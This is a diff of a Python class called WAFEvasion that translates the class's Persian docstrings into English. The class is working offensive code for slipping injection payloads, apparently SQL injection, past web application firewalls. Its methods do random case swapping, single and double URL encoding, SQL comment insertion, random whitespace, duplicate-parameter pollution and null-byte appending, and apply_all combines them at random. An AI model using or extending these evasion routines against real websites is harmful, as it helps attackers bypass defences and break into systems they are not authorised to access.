@@ -22,7 +22,7 @@ class WAFEvasion:
         ]
 
     def _case_swapping(self, payload):
-        """Change case (مثلاً SeLeCt)"""
+        """Change case (e.g. SeLeCt)"""
         return "".join(random.choice([c.upper(), c.lower()]) for c in payload)
 
     def _url_encoding(self, payload):
@@ -30,17 +30,17 @@ class WAFEvasion:
         return urllib.parse.quote(payload)
 
     def _double_encoding(self, payload):
-        """کدگذاری دوبل URL"""
+        """Double URL encode"""
         return urllib.parse.quote(urllib.parse.quote(payload))
 
     def _comment_insertion(self, payload):
-        """اضافه کردن کامنت‌های SQL"""
+        """Add SQL comments"""
         if "'" in payload or '"' in payload:
             return payload.replace("'", "'/**/")
         return payload + "/**/"
 
     def _whitespace_insertion(self, payload):
-        """Add spaces‌های تصادفی"""
+        """Add random spaces"""
         chars = list(payload)
         for i in range(len(chars)):
             if random.random() < 0.2:
@@ -48,15 +48,15 @@ class WAFEvasion:
         return "".join(chars)
 
     def _parameter_pollution(self, payload):
-        """Inject parameterهای تکراری"""
+        """Inject duplicate parameters"""
         return f"{payload}&id={random.randint(1,999)}"
 
     def _null_byte_injection(self, payload):
-        """تزریق Null Byte"""
+        """Inject Null Byte"""
         return payload + "%00"
 
     def apply_all(self, payload):
-        """اعمال همه تکنیک‌ها به صورت تصادفی"""
+        """Apply all techniques randomly"""
         modified = payload
         for technique in random.sample(self.techniques, random.randint(1, 3)):
             try:
